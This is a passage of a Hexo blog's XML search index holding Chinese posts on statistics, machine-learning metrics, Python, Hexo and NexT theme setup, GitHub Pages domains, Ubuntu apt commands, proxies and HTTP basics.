N(0,1)$。二、中心极限定理2.1 中心极限定理定义中心极限定理（central limit theorem)：设从均值为$\mu$、方差为$\sigma^{2}$（有限）的任意一个总体中抽取样本量为n的样本，当n充分大时，样本均值$\overline{X}$的抽样分布近似服从均值为$\mu$、方差为$\sigma^{2}/n$的正态分布。2.2 n&gt;30一般为大样本的分界线中心极限定理要求n必须充分大，那么多大才叫充分大呢？这与总体的分布形状有关。总体偏离正态越远．则要求n越大。然而在实际应用中，总体的分布未知。此时，我们常要求n&gt;=30。顺便指出，大样本、小样本之间并不是以样本容量大小来区分的。在样本容量固定的条件下所进行的统计推断、问题分析，不管样本容量有多大，都称为小样本问题；而在样本容量$n \rightarrow \infty$的条件下进行的统计推断、问题分析则称为大样本问题。一般统计学中的n&gt;=30为大样本，n&lt;30为小样本只是一种经验说法。]]></content>
      <categories>
        <category>统计</category>
        <category>概率</category>
      </categories>
      <tags>
        <tag>概率</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[机器学习评价指标]]></title>
    <url>%2Farchives%2F31315aab.html</url>
    <content type="text"><![CDATA[评价指标是机器学习任务中非常重要的一环。不同的机器学习任务有着不同的评价指标，同时同一种机器学习任务也有着不同的评价指标，每个指标的着重点不一样。分类混淆矩阵^1True Positive(真正, TP)：将正类预测为正类数.True Negative(真负 , TN)：将负类预测为负类数.False Positive(假正, FP)：将负类预测为正类数 $\rightarrow$ 误报 (Type I error).False Negative(假负 , FN)：将正类预测为负类数 $\rightarrow$ 漏报 (Type II error).精确率(precision)定义为：$$P = \frac{TP}{TP+FP} \tag{1}$$需要注意的是精确率(precision)和准确率(accuracy)是不一样的，$$ACC = \frac{TP + TN}{TP+TN+FP+FN}$$在正负样本不平衡的情况下，准确率这个评价指标有很大的缺陷。比如在互联网广告里面，点击的数量是很少的，一般只有千分之几，如果用acc，即使全部预测成负类（不点击）acc 也有 99% 以上，没有意义。召回率(recall,sensitivity,true positive rate)定义为：$$R = \frac{TP}{TP+FN} \tag{2}$$此外，还有 $F_1$ 值，是精确率和召回率的调和均值，$$\frac{2}{F_1} = \frac{1}{P} + \frac{1}{R}$$$$F_1 = \frac{2TP}{2TP + FP + FN} \tag{3}$$精确率和准确率都高的情况下，$F_1$ 值也会高。通俗版本刚开始接触这两个概念的时候总搞混，时间一长就记不清了。实际上非常简单，精确率是针对我们预测结果而言的，它表示的是预测为正的样本中有多少是对的。那么预测为正就有两种可能了，一种就是把正类预测为正类(TP)，另一种就是把负类预测为正类(FP)。而召回率是针对我们原来的样本而言的，它表示的是样本中的正例有多少被预测正确了。那也有两种可能，一种是把原来的正类预测成正类(TP)，另一种就是把原来的正类预测为负类(FN)。在信息检索领域，精确率和召回率又被称为查准率和查全率，$$\text{查准率}＝\frac{\text{检索出的相关信息量}}{\text{检索出的信息总量}}$$$$\text{查全率}＝\frac{\text{检索出的相关信息量}}{\text{系统中的相关信息总量}}$$ROC 曲线我们先来看下维基百科的定义，In signal detection theory, a receiver operating characteristic (ROC), or simply ROC curve, is a graphical plot which illustrates the performance of a binary classifier system as its discrimination threshold is varied.比如在逻辑回归里面，我们会设一个阈值，大于这个值的为正类，小于这个值为负类。如果我们减小这个阀值，那么更多的样本会被识别为正类。这会提高正类的识别率，但同时也会使得更多的负类被错误识别为正类。为了形象化这一变化，在此引入 ROC ，ROC 曲线可以用于评价一个分类器好坏。ROC 关注两个指标，$$\text{true positive rate}: \qquad TPR = \cfrac{TP}{TP+FN}$$$$\text{false positive rate}: \qquad FPR = \cfrac{FP}{FP + TN}$$直观上，TPR 代表能将正例分对的概率，FPR 代表将负例错分为正例的概率。在 ROC 空间中，每个点的横坐标是 FPR，纵坐标是 TPR，这也就描绘了分类器在 TP（真正率）和 FP（假正率）间的 trade-off^3。AUCAUC（Area Under Curve）被定义为ROC曲线下的面积，显然这个面积的数值不会大于1。The AUC value is equivalent to the probability that a randomly chosen positive example is ranked higher than a randomly chosen negative example.翻译过来就是，随机挑选一个正样本以及一个负样本，分类器判定正样本的值高于负样本的概率就是 AUC 值。简单说：AUC值越大的分类器，正确率越高^2。$AUC = 1$，完美分类器，采用这个预测模型时，不管设定什么阈值都能得出完美预测。绝大多数预测的场合，不存在完美分类器。$0.5 &lt; AUC &lt; 1$，优于随机猜测。这个分类器（模型）妥善设定阈值的话，能有预测价值。$AUC = 0.5$，跟随机猜测一样（例：丢铜板），模型没有预测价值。$AUC &lt; 0.5$，比随机猜测还差；但只要总是反预测而行，就优于随机猜测，因此不存在 $AUC &lt; 0.5$ 的情况。既然已经这么多评价标准，为什么还要使用ROC和AUC呢？因为ROC曲线有个很好的特性：当测试集中的正负样本的分布变化的时候，ROC曲线能够保持不变。在实际的数据集中经常会出现类不平衡（class imbalance）现象，即负样本比正样本多很多（或者相反）回归^4平均绝对误差平均绝对误差MAE（Mean Absolute Error）又被称为 $l_1$ 范数损失（l1-norm loss）：$${\rm MAE}(y, \hat{y})=\frac{1}{n_{\rm samples}}\sum\limits_{i=1}^{n_{\rm samples}}|y_i-\hat{y}_i|$$平均平方误差平均平方误差 MSE（Mean Squared Error）又被称为 $l_2$ 范数损失（l2-norm loss）：$${\rm MSE}(y, \hat{y})=\frac{1}{n_{\rm samples}}\sum\limits_{i=1}^{n_{\rm samples}}(y_i-\hat{y}_i)^2$$本文转载于：机器学习性能评估指标]]></content>
      <categories>
        <category>机器学习</category>
        <category>评价指标</category>
      </categories>
      <tags>
        <tag>机器学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hexo加入豆瓣读书页面]]></title>
    <url>%2Farchives%2Fc7ba3a41.html</url>
    <content type="text"><![CDATA[在Hexo博客个性化定制中，加入豆瓣读书界面是一个很不错的功能。GitHub上已经有人写好了这个模块：hexo-douban，我们只需要安装模块，然后配置一下就可以了。安装1npm install hexo-douban --save配置将下面的配置写入站点的配置文件_config.yml里12345678910111213douban: user: mythsman builtin: false book: title: &apos;This is my book title&apos; quote: &apos;This is my book quote&apos; movie: title: &apos;This is my movie title&apos; quote: &apos;This is my movie quote&apos; game: title: &apos;This is my game title&apos; quote: &apos;This is my game quote&apos; timeout: 10000user: 你的豆瓣ID.打开豆瓣，登入账户，然后在右上角点击 “个人主页” ，这时候地址栏的URL大概是这样：”https://www.douban.com/people/xxxxxx/“ ，其中的”xxxxxx”就是你的个人ID了。builtin: 是否将生成页面的功能嵌入hexo s和hexo g中，默认是false,另一可选项为true(1.x.x版本新增配置项)。title: 该页面的标题。quote: 写在页面开头的一段话,支持html语法。timeout: 爬取数据的超时时间，默认是 10000ms ,如果在使用时发现报了超时的错(ETIMEOUT)可以把这个数据设置的大一点。如果只想显示某一个页面(比如movie)，那就把其他的配置项注释掉即可。启动我们只需要在Git Bash中输入以下命令：hexo clean &amp;&amp; hexo douban -bgm &amp;&amp; hexo g &amp;&amp; hexo s即可，注意其中开启hexo-douban的命令中，-bgm代表的是book、game、movie三个参数，如果只需要其中的一部分就只带你想要的那些参数。注意：由于hexo douban的简写也是hexo d，与hexo deploy的简写指令hexo d冲突，因此在进行二者部署的时候，只能都打全名而不能打简写形式。在0.x.x版本中，文章的更新和豆瓣页面的爬取操作是绑定在一起的，无法支持单独更新文章或者单独爬取文章。在1.x.x版本中，使用hexo douban命令即可生成指定页面，如果不加参数，那么默认参数为-bgm。如果配置了builtin参数为true，那么除了可以使用hexo douban命令之外，hexo g或hexo s也内嵌了生成页面的功能。因此，还是按照hexo clean &amp;&amp; hexo g &amp;&amp; hexo s就可以。测试上面都没问题之后，我们只需要在站点目录下测试http://localhost:4000/books或者http://localhost:4000/movies等，如果看到页面了就说明成功了。部署如果上述都没有问题，我们就可以在菜单栏中添加按钮了，打开主题配置文件_config.yml，找到菜单按钮，添加下面内容：123menu: movies: /movies/ || film books: /books/ || book然后在next/language/zh-CN.yml文件中添加对应的中文参数信息：123menu: movies: 观影 books: 阅读至此，我们就完成了豆瓣读书页面的添加。参考在Hexo博客中加入豆瓣读书页面hexo-douban]]></content>
      <categories>
        <category>工具使用</category>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python函数args与kwargs的用法]]></title>
    <url>%2Farchives%2F27d1188f.html</url>
    <content type="text"><![CDATA[*表达式在讨论*args和**kwargs之前，我们需要先介绍一下Python中的*表达式。123456789&gt;&gt;&gt; user_info = ('snowball', 'USTC', '183xxxx1966', '188xxxx7604')&gt;&gt;&gt; name, school, *phone_number = user_info&gt;&gt;&gt; name'snowball'&gt;&gt;&gt; school'USTC'&gt;&gt;&gt; phone_number['183xxxx1966', '188xxxx7604']*phone_number表示的是一个列表，它将存储元组中剩下的所有元素。即使元组中剩下元素的个数为0，代码也不会报错，因为此时*表达式所对应的是一个空列表。*args和**kwargs*args和**kwargs的写法只是约定俗称的，我们完全可以按照自己的喜好来给参数变量命名，例如*var和**vars。*args和**kwargs都主要用于函数定义，表示的是可将不定数量的参数传递给一个函数。这里不定数量的含义是指，我们预先并不清楚，函数的使用者究竟会传递多少个参数给函数。这时，使用*args和**kwargs将会帮助我们处理这种情况。*args的用法*args用来向函数传递一个非键值对的可变长度的参数列表。**kwargs的用法**kwargs中的kw的含义是key-word pairs，也就是键值对。**kwargs用来向函数传递一个不定长度的键值对。如果我们想要我们的函数能够处理带名字的参数，我们应该使用**kwargs。注意：当我们同时使用*args和**kwargs时，*args参数必须要在**kwargs前。一个小例子1234def fun(*args,**kwargs): print('args=', args) print('kwargs=',kwargs)fun(1,2,3,4,A='a',B='b',C='c',D='d')结果如下：12args= (1, 2, 3, 4)kwargs= &#123;&apos;A&apos;: &apos;a&apos;, &apos;B&apos;: &apos;b&apos;, &apos;C&apos;: &apos;c&apos;, &apos;D&apos;: &apos;d&apos;&#125;参考理解Python函数参数*args和**kwargsPython函数args与kwargs的用法]]></content>
      <categories>
        <category>Python</category>
        <category>基础</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[美女猜硬币]]></title>
    <url>%2Farchives%2Fe69ee20f.html</url>
    <content type="text"><![CDATA[你在酒吧独自喝闷酒，旁边来了个美女，手里拿两个硬币，要你陪她玩这么个游戏:每人一个硬币，每次两人一起给出正反面如果:两个正面，你赢 3 块钱两个反面，你赢 1 块钱一正一反，你输 2 块钱那么是不是又不花钱，还有美女陪你玩挺不错的？那么作为一个守财如命的小青年，我是应该跟美女玩，还是不玩呢？问题解答现在我们假设：你出正面的概率是X，那么反面的概率是1-X；美女出正面的概率是Y，那么反面的概率是1-Y赢的概率乘以赢的金额，等于赢的预期，而你赢美女的预期公式就是，你赢的预期-美女的赢的预期。下面我们分别算出你和美女的预期。只要哪一方的概率高出哪一方，那么谁就可以赢：你的盈利是3块和1块两种，概率也有两组“双正面3(XY)，或者双反面1(1-x)(1-Y)”你的赢面 = 3(XY)+1(1-x)(1-Y)美女的盈利是2块和2块，概率也有两组“正面+反面”2X(1-Y)，或者“反面+正面”2Y(1-X)：美女的赢面 = 2X(1-Y)+2Y(1-X)你的赢面-美女的赢面，等于你的赢面。3(XY)+1(1-x)(1-Y) - 2X(1-Y)+2Y(1-X)经过展开，最后公式可以简化为：8XY-3X-3Y+1注意，既然XY都是概率，那么他们的数值就是介于0-1之间。如果你的赢面预期&lt;0（就是前面的减法），那么你就是一直输钱的。这个美女就在想，我需要调整Y的概率，让你不管是出正面还是反面，都是输钱，也就是让你期望值小于0。我们可以将最后公式中的Y（女人的概率）提取出来：(8X-3)Y - 3X+1 &lt; 0只要这个不等式小于0，那美女就可以一直赢！这时候问题就很简单了，只要(8X-3)Y &lt; 3X+1，小数减大数，永远是负数，不会大于0。结果是当Y处于“1/3到2/5”之间的时候，男人的期望值都是负数。参考非理性行为—和美女猜硬币怎么样才能一直赢]]></content>
      <categories>
        <category>统计</category>
        <category>概率</category>
      </categories>
      <tags>
        <tag>概率</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[GitHub Pages绑定域名]]></title>
    <url>%2Farchives%2Fb48e2719.html</url>
    <content type="text"><![CDATA[域名选购域名注册商有很多，国内的万网，国外的GoDaddy等等。区别在于国内域名注册后需要备案，因为政策因素也可能随时被停用，相对的，国外注册域名在交流和沟通方面不如国内方便，而因为没有国内的政策限制，域名注册商通常会给予用户域名的完全控制权与转移权，在安全性方面可能比国内稍差。本站域名申请使用国外域名平台Namesilo，是目前价格较便宜的域名平台，支持支付宝、Paypal、Visa等多种付款方式，提供免费的域名隐私保护，性价比较高，用户评价也不错。NS修改国外的域名使用默认的域名服务器（NS）解析可能较慢，网上很多人推荐转到DNSPod，也就是说指派DNSPod进行域名的解析工作。1、注册DNSPod账号在DNSPod官网注册账号，在域名解析页面选择添加域名，添加已购买的域名。完成后点击查看，DNSPod提供两条默认的NS记录：12f1g1ns1.dnspod.netf1g1ns2.dnspod.net2、修改Namesilo中NS记录登录Namesilo，选择Manage My Domains，进入域名管理页面。勾选你的域名，点击选项栏中的Change Nameservers。将NS1，NS2改为DNSPod提供的两条NS记录，删除第三条NS记录，点击提交。NS的修改需要一段时间，一般最长48小时生效，个人情况来看，10分钟左右即可完成更改。 3、DNSPod解析服务自 2018 年 5 月 1 日，Github 支持自定义域名的 HTTPS 请求了。配置也相当简单，只需要更新 DNS 配置里的 A 记录，将其指向以下4个 IP 地址中的至少一个。185.199.108.153185.199.109.153185.199.110.153185.199.111.153HTTPS 让你的网站和网站访客更安全，并且 Github 提供的这些 IP 地址自动将你的站点加入了 CDN，提高了访问速度。你还可以在 GiHub Pages 仓库的设置里勾选 ‘Enforce HTTPS’，这样所有访问你站点的请求都会走 HTTPS。下面我们添加三个数据123@ A 185.199.108.153@ A 185.199.109.153www CNAME username.github.io其中 185.199.108.153 和 185.199.109.153 都是 GitHub 的地址。上述设置的解释：设置 A 记录的意思是，当我输入 tding.top 这个域名的时候，访问的是 185.199.108.153 这个地址；设置 CNAME 的意思是，当我访问 dta0502.github.io 这个地址的时候，会跳转到 tding.top，之后的过程就和 A 记录相同了，即访问 185.199.108.153。添加CNAME文件在Hexo本地目录中的source文件夹里，添加一个命名为CNAME的无后缀文件，文件中的填写你的域名。如果你想让地址栏的域名显示www前缀就输入www.xxxxx.com，否则输入xxxxx.com即可。例如：1tding.top12hexo ghexo dGithub Pages对自定义域上Https然后我们在 Github Pages 项目中 Settings 选项卡 Github Pages 选项：在 Custom domain 添加你的自定义域名。例如我配置apex domain「tding.top」点击 save 保存刷新页面 如果能勾选 Enforce HTTPS 即完成。现在，我们就可以通过https访问自定义域了。参考Hexo基础教程(二)：个人域名绑定github怎么绑定自己的域名？为 Github 上的 Hexo 博客绑定个性域名自定义域故障排除]]></content>
      <categories>
        <category>工具使用</category>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
        <tag>GitHub Pages</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hexo-NexT(v7.0+)主题配置]]></title>
    <url>%2Farchives%2F42c38b10.html</url>
    <content type="text"><![CDATA[注意：本文的NexT主题版本为7.1.2。一、获取NexT1、下载最新 release 版本通常情况下请选择 stable 版本。推荐不熟悉的用户按此方式进行。这种方式将仅提供最新的 release 版本（其中不附带 .git 目录）。因此，将来你将不可能通过 git 更新这一方式安装的主题。为了能不丢失你的自定义配置，你可以使用独立的配置文件（例如 数据文件）并下载最新版本到旧版本的目录中（或者下载到新的主题目录中并修改 Hexo 配置中的主题名）。二、站点配置1、设置hexo的next主题找到theme后修改为:1theme: next #配置成刚下载的next主题2、配置hexo网站相关信息12345678# Sitetitle: #网站标题subtitle: #网站副标题description: #描述,介绍网站的keywords: #网站的关键字author: #博主姓名language: zh-CN #语言 zh-CN 是简体中文timezone: UTC #时区注意：博客框架默认的语言是英文，前往/themes/next/languages，查看当前NexT版本简体中文对照文件的名称是zh-Hans还是zh-CN。这里是zh-CN。3、设置hexo永久链接1234567url: https://dta0502.github.io/root: /permalink: archives/:abbrlink.htmlabbrlink: alg: crc32 # 算法：crc16(default) and crc32 rep: hex # 进制：dec(default) and hexpermalink_defaults:4、nofollow标签的使用减少出站链接能够有效防止权重分散，hexo有很方便的自动为出站链接添加nofollow的插件。首先安装hexo-autonofollow插件：1npm install hexo-autonofollow --save再在外层_config.yml中添加配置，将nofollow设置为true：12345# 外部链接优化nofollow: enable: true exclude: # 例外的链接，可将友情链接放置此处 - &apos;yousite&apos;这样，例外的链接将不会被加上nofollow属性。三、主题配置1、配置hexo中的about,tag,categories,sitemap菜单默认菜单只开启了首页和归档,hexo所有图标均来自fontawesome。1234567891011121314#菜单设置为 菜单名: /菜单目录 || 菜单图标名字menu: home: / || home about: /about/ || user tags: /tags/ || tags categories: /categories/ || th archives: /archives/ || archive #schedule: /schedule/ || calendar sitemap: /sitemap.xml || sitemap commonweal: /404/ || heartbeatmenu_settings: icons: true #显示图标 badges: true #显示统计信息2、手动生成hexo菜单对应文件新菜单开启后是没有对应文件的,所以要手动生成about,tags,categories和404页面,这里我们将404替换成腾讯的公益页面新建about页面12cd hexohexo new page about #about就是普通的布局一般用来介绍站点信息和博主信息等新建一个tags页面1hexo new page tags找到tags文件 hexo/source/tags/index.md 编辑它,在头部修改为123456---title: 标签date: 2019-06-29 11:35:42 #时间随意type: &quot;tags&quot; #类型一定要为tagscomments: false #提示找个页面不需要评论,后续评论插件那里会详细介绍---新建一个categories页面1hexo new page categories找到categories文件 blog/source/categories/index.md 编辑它,在头部修改为123456---title: 文章分类date: 2018-10-15 00:03:57type: &quot;categories&quot;comments: false---新建一个404页面1hexo new page 404找到404文件 blog/source/404/index.md 编辑它,内容全部替换成如下123456789&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt;&lt;meta charset="UTF-8"&gt;&lt;title&gt;404&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;script type="text/javascript" src="//qzonestyle.gtimg.cn/qzone/hybrid/app/404/search_children.js" charset="utf-8" homePageUrl="/" homePageName="返回"&gt;&lt;/script&gt; &lt;/body&gt;&lt;/html&gt;3、配置hexo本地搜索本地搜索的原理对于动态网站来说，可以通过 php 实现。但是，GitHub博客是静态网站，用不了 php。NexT 主题实现这个功能，用了 Hexo 的拓展包 hexo-generator-searchdb，它预先生成了一个文本库search.xml，然后传到了网站里面 。在本地搜索的时候，NexT直接用javascript调用了这个文件，从而实现了静态网站的本地搜索。设置过程安装插件:1npm install hexo-generator-searchdb --save主题配置文件如下:12345local_search: enable: true trigger: auto top_n_per_article: 1 unescape: false站点配置文件新添加如下代码:12345search: path: search.xml field: post format: html limit: 1004、设置hexo中的rss订阅安装插件：1npm install hexo-generator-feed --save刷新主页就可以看到rss。5、配置hexo站点的footer信息底部footer可以开关显示hexo版权,theme版权,还有建站时间等个性化配置12345678910111213footer: since: 2018 #建站开始时间 icon: name: user #设置 建站初始时间和至今时间中间的图标 默认是一个&apos;小人像&apos;更改user为heart可以变成一个&apos;心&apos; animated: true color: &quot;#808080&quot; #更改图标的颜色 红色为 &apos;#ff0000&apos; powered: enable: true #是否开启hexo驱动 version: true #是否开启hexo版本号 theme: enable: true #是否开启theme驱动 version: true #是否开启主题版本号 custom_text: Hosted by &lt;a target=&quot;_blank&quot; rel=&quot;external nofollow&quot; href=&quot;https://pages.coding.me&quot;&gt;&lt;b&gt;Coding Pages&lt;/b&gt;&lt;/a&gt; #这里的底部标识是为了添加coding page服务时的版权声明 打开注释就可以看到底部有一个 hosted by coding pages6、配置hexo中next主题样式选择next一共提供了4种首页样式,按照自己喜好选择一个,切记选择一个其他主题后其他的主题之前一定要加上#12345# Schemes#scheme: Muse#scheme: Mist#scheme: Piscesscheme: Gemini7、头像信息设置12345avatar: url: /images/avatar.jpg #设置头像资源的位置 rounded: false #开启圆形头像 opacity: 1 #不透明的比例 0 就是完全透明 rotated: false #开启旋转8、社交信息和友链配置这里和菜单设置格式一样 社交名字: 社交url || 社交图标 ,图标信息还是fontawesome12345678social: GitHub: https://github.com/yourname || github E-Mail: mailto:yourname@gmail.com || envelope Google: https://plus.google.com/yourname || googlesocial_icons: enable: true #显示社交图标 icons_only: false #只显示图标的开关友链配置1234567# Blog rollslinks_icon: link #友链的图标 参考上文links_title: Links #友链的title 比如你可以更改为 友情链接links_layout: block #友链摆放的样式,按块 一行一个#links_layout: inline #按线摆放,一行很多个 切记 同时只能一种样式links: Title: http://example.com/ #友链的地址9、首页文章不展示全文显示摘要123456789scroll_to_more: true #点击阅读全文后是否跳到&lt;!--more--&gt;标记处,设为false时点击阅读全文可以从头阅读save_scroll: false #自动保存每篇文章或页面上一次滚动的地方excerpt_description: true #自动在首页对文章进行摘要描述作为前言文本auto_excerpt: #是否自动截取摘要 enable: false #设置为true则自动截取150字当做首页摘要 length: 150 #自动截取的字数10、首页文章属性1234567post_meta: item_text: false # 设为true 可以一行显示 文章的所有属性 created_at: true #显示创建时间 updated_at: enabled: true #显示修改的时间 another_day: true #设true时 如果创建时间和修改时间一样则显示一个时间 categories: true #显示分类信息11、页面阅读统计12345678busuanzi_count: enable: false #设true 开启 total_visitors: true #总阅读人数 uv数 total_visitors_icon: user #阅读总人数的图标 total_views: true #总阅读次数 pv数 total_views_icon: eye #阅读总次数的图标 post_views: true #开启内容阅读次数 post_views_icon: eye #内容页阅读数的图标12、字数统计、阅读时长安装插件：1npm install hexo-symbols-count-time --save主题配置信息如下:123456symbols_count_time: separated_meta: true # false 会显示一行 item_text_post: true # 显示属性名称,设为false后只显示图标和统计数字,不显示属性的文字 item_text_total: true #底部footer是否显示字数统计属性文字 awl: 4 #计算字数的一个设置,没设置过 wpm: 275 #一分钟阅读的字数站点配置新增如下:1234567symbols_count_time: #文章内是否显示 symbols: true time: true # 网页底部是否显示 total_symbols: true total_time: true13、内容页里的代码块新增复制按钮1234codeblock: copy_button: enable: false #增加复制按钮的开关 show_result: false #点击复制完后是否显示 复制成功 结果提示14、配置微信,支付宝打赏12345# Rewardreward_comment: #打赏描述wechatpay: /images/wechatpay.png #微信支付的二维码图片地址alipay: /images/alipay.png #支付宝的地址#bitcoin: /images/bitcoin.png #这个是设置比特币的15、相关文章推荐安装推荐文章的插件1npm install hexo-related-popular-posts --save主题配置信息如下:12345678910related_posts: enable: true title: 相关文章推荐 # 属性的命名 display_in_home: false #false代表首页不显示 params: maxCount: 5 #最多5条 #PPMixingRate: 0.0 #可以看github上 这个相关度介绍 #isDate: true #是否显示 日期 #isImage: false #是否显示配图 isExcerpt: false #是否显示摘要16、文章原创申明12345creative_commons: license: by-nc-sa sidebar: false post: true # 将false改为true即可显示版权信息 language:17、背景动画设置Canvas-nest风格进入theme/next目录，执行命令：1git clone https://github.com/theme-next/theme-next-canvas-nest source/lib/canvas-nest实际上就是将一个显示动效的js文件clone到对应目录。这时将配置文件_config.yml中的canvas_nest: false改为canvas_nest: true才能真正生效。个人认为在站点中添加动态背景并没有实际的意义，只会凭空增加页面内存占用及 CPU 消耗。18、添加Google统计访问Google Analytics,需要登录,按照提示填写网站信息开通GA服务，获取统计ID。编辑主题配置文件, 找到关键字google_analytics , 删除注释#并填写获取到的统计ID。1234# Google Analyticsgoogle_analytics: tracking_id: localhost_ignored: true19、Google Search Console该版本已经集成了HTML标记的验证方式。查看原标记,将其中content字段引号内的内容拷贝出来修改主题配置文件。搜索google_site_verification,将上述拷贝的内容复制在该值后面。123# Google Webmaster tools verification setting# See: https://www.google.com/webmasters/google_site_verification: uW8bwgMGUwIA01nPfItoty1rmtmmuVkOVTeS9O0nAUg四、参考30分钟快速搭建hexo3.7.0 + next主题6.4教程(持续更新最新版)Hexo框架下用NexT(v7.0+)主题美化博客]]></content>
      <categories>
        <category>工具使用</category>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
        <tag>NexT</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Ubuntu下软件安装和卸载总结]]></title>
    <url>%2Farchives%2F8f40be05.html</url>
    <content type="text"><![CDATA[本文主要记录Ubuntu下软件的最佳安装和卸载命令。一、命令1、最佳卸载命令1apt-get remove packagename --purge &amp;&amp; apt-get autoremove --purge &amp;&amp; apt-get clean卸载程序(包括配置文件)、卸载依赖、删除/var/cache/apt/archives下所有安装包2、最佳升级软件命令1apt-get update &amp;&amp; apt-get upgrade二、扩展知识1、apt常用命令apt-cache show packagename 获取包的相关信息，如说明、大小、版本等apt-cache depends packagename 了解使用依赖apt-cache rdepends packagename 是查看该包被哪些包依赖apt-get install packagename 安装包apt-get install package=version 指定安装版本apt-get install packagename --reinstall 重新安装包apt-get remove packagename --purge 卸载程序，包括删除配置文件等apt-get update 更新源,更新 /etc/apt/sources.list 里的链接地址apt-get upgrade -u 升级程序(不包括依赖关系改变的) -u 完整显示列表apt-get dist-upgrade 升级程序(包括依赖关系改变的并且重新组织依赖关系)apt-get clean 删除安装包(节约硬盘空间,下次安装需要重新下载包，软件包位置：/var/cache/apt/archives/)apt-get autoclean 删除已卸载的安装包(Ubuntu14.04测试发现没起作用)apt-get autoremove 卸载依赖的程序2、apt-get 安装位置下载的软件存放位置 /var/cache/apt/archives安装后软件默认位置 /usr/share可执行文件位置 /usr/binlib文件位置 /usr/lib3、Linux 常用目录/boot 引导程序，内核等存放的目录/sbin 超级用户可以使用的命令的目录/bin 普通用户使用的命令/lib 共享库目录/dev 设备目录/root 用户root的home目录/etc 全局配置文件目录/usr 用户安装目录/usr/include C程序语言编译使用的头文件/proc 系统内部一些信息/var 经常变化目录 经常放日志文件，缓存文件/tmp 临时目录 系统断电 或许目录被会清空/lost+found 当系统崩溃的时候，在系统修复过程中需要恢复的文件，可能就会在这里被找到了，这个目录一般为空可以通过 man hier 详细查看目录用途，man是打开说明文档,例如：man apt-get查看apt-get详细说明，比help要详细本文转载于：「Ubuntu命令」安装和卸载]]></content>
      <categories>
        <category>工具使用</category>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Ubuntu</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[正向代理、反向代理介绍]]></title>
    <url>%2Farchives%2Fc694b45.html</url>
    <content type="text"><![CDATA[正向代理与反向代理的区别在于代理的对象不一样：正向代理代理的对象是客户端，反向代理代理的对象是服务端。本文对它们做一个通俗的介绍。一、正向代理A同学在大众创业、万众创新的大时代背景下开启他的创业之路，目前他遇到的最大的一个问题就是启动资金，于是他决定去找马云爸爸借钱，可想而知，最后碰一鼻子灰回来了，情急之下，他想到一个办法，找关系开后门，经过一番消息打探，原来A同学的大学老师王老师是马云的同学，于是A同学找到王老师，托王老师帮忙去马云那借500万过来，当然最后事成了。不过马云并不知道这钱是A同学借的，马云是借给王老师的，最后由王老师转交给A同学。这里的王老师在这个过程中扮演了一个非常关键的角色，就是代理，也可以说是正向代理，王老师代替A同学办这件事，这个过程中，真正借钱的人是谁，马云是不知道的，这点非常关键。我们常说的代理也就是只正向代理，正向代理的过程，它隐藏了真实的请求客户端，服务端不知道真实的客户端是谁，客户端请求的服务都被代理服务器代替来请求，某些科学上网工具扮演的就是典型的正向代理角色。用浏览器访问 http://www.google.com 时，被残忍的block，于是你可以在国外搭建一台代理服务器，让代理帮我去请求google.com，代理把请求返回的相应结构再返回给我。二、反向代理大家都有过这样的经历，拨打10086客服电话，可能一个地区的10086客服有几个或者几十个，你永远都不需要关心在电话那头的是哪一个，叫什么，男的，还是女的，漂亮的还是帅气的，你都不关心，你关心的是你的问题能不能得到专业的解答，你只需要拨通了10086的总机号码，电话那头总会有人会回答你，只是有时慢有时快而已。那么这里的10086总机号码就是我们说的反向代理。客户不知道真正提供服务人的是谁。反向代理隐藏了真实的服务端，当我们请求 www.baidu.com 的时候，就像拨打10086一样，背后可能有成千上万台服务器为我们服务，但具体是哪一台，你不知道，也不需要知道，你只需要知道反向代理服务器是谁就好了，www.baidu.com 就是我们的反向代理服务器，反向代理服务器会帮我们把请求转发到真实的服务器那里去。Nginx就是性能非常好的反向代理服务器，用来做负载均衡。两者的区别在于代理的对象不一样：正向代理代理的对象是客户端，反向代理代理的对象是服务端。参考：反向代理为何叫反向代理？]]></content>
      <categories>
        <category>计算机基础</category>
        <category>网络</category>
      </categories>
      <tags>
        <tag>网络</tag>
        <tag>代理</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[HTTP]]></title>
    <url>%2Farchives%2Fa1ede006.html</url>
    <content type="text"><![CDATA[本文链接：https://github.com/CyC2018/CS-Notes/blob/master/notes/HTTP.md作者：CyC2018一 、基础概念Web 基础URL请求和响应报文二、HTTP 方法GETHEADPOSTPUTPATCHDELETEOPTIONSCONNECTTRACE三、HTTP 状态码1XX 信息2XX 成功3XX 重定向4XX 客户端错误5XX 服务器错误四、HTTP 首部通用首部字段请求首部字段响应首部字段实体首部字段五、具体应用Cookie缓存持久连接管线化处理编码分块传输编码多部分对象集合范围请求内容协商虚拟主机通信数据转发六、HTTPs加密认证完整性七、Web 攻击技术攻击模式跨站脚本攻击跨站点请求伪造SQL 注入攻击拒绝服务攻击八、GET 和 POST 的区别参数安全幂等性可缓存XMLHttpRequest九、各版本比较HTTP/1.0 与 HTTP/1.1 的区别HTTP/1.1 与 HTTP/2.0 的区别参考资料一 、基础概念Web 基础HTTP（HyperText Transfer Protocol，超文本传输协议）。WWW（World Wide Web）的三种技术：HTML、HTTP、URL。RFC（Request for Comments，征求修正意见书），互联网的设计文档。URLURI（Uniform Resource Indentifier，统一资源标识符）URL（Uniform Resource Locator，统一资源定位符）URN（Uniform Resource Name，统一资源名称），例如 urn:isbn:0-486-27557-4 。URI 包含 URL 和 URN，目前 WEB 只有 URL 比较流行，所以见到的基本都是 URL。请求和响应报文1. 请求报文2. 响应报文二、HTTP 方法客户端发送的 请求报文 第一行为请求行，包含了方法字段。GET获取资源当前网络请求中，绝大部分使用的是 GET 